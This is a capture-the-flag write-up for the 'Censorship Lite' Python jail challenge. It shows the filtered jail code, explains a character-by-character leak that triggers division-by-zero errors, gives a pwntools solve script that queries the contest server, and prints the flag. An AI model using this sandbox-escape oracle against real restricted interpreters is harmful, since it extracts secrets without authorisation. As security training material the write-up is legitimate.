# Misc - Censorship Lite

## Problem

We are faced with yet another Python jail problem:

```python
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```

It is mentioned in problem statement that flag format is `amateursCTF{[a-zA-Z_]*}`

## Solution

The difficulty for this Python Jail is further increased, with `\lite0123456789` and `:<(){}*,-.` blocked. This effectively blocks most functions calls. One notable exception is `>` character. 

The main idea here is to compute `1/(_[flag_pos]>test_char)`. To generate numbers, recall that:
* `z = False + False = 0` and `o = False + True = 1`. We can construct `False` via `'b'>'b'` and `True` via `'b'>'a'`
* We also replace flag_pos with `(o+o+...+o)`


We can now compute and enumerate every flag character depending on whether `zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` is printed (i.e. exception thrown), and stop when it first throws. However, for characters `lite` can be `mjuf` as we are not directly testing `lite` due to the filter. Some guesswork at the end helps us obtain the flag.

Solve script is as follows:

```python
import string
from pwn import *

r = remote('amt.rs', 31672)
print(r.recv(256))
# Needs correction for some "lite" to "mjuf" or vice versa
flag = 'amateursCTF{'
# e.g. 'elag' --> 'flag'
corrected_flag = 'amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}'
print(len(flag))
flaglen = 97
# Re-run a few times due to timeout, store partial result in "flag"
censor = "lite0123456789 :< :( ): :{ }: :*\ ,-."
for j in range(len(flag), flaglen + 1):
    for c in string.ascii_uppercase + '_' + string.ascii_lowercase:
        if c in censor:
            continue
        baselogic="x='a'>'a';y='b'>'a';z=x+x;o=x+y;"
        # Attempt to trigger division by zero for confirmation (j > 0 since "amateursCTF{" is known)
        jstr = '+'.join(['o']*j)
        divzero_test = f"d=_[{jstr}]>'{c}';o/d;"
        payload = baselogic + divzero_test
        r.sendline(payload.encode('utf-8'))
        res = r.recv(256).decode('utf-8')
        if 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz' in res:
            # Special chars may have more options, but "lite" appearances make sense in most cases

            if chr(ord(c) - 1) in 'lite':
                print(f'Position {j} is either {c} or {chr(ord(c) - 1)}')
                flag += chr(ord(c) - 1)
            else:
                flag += c
            print('FLAG:', flag)
            break
```

## Flag

amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}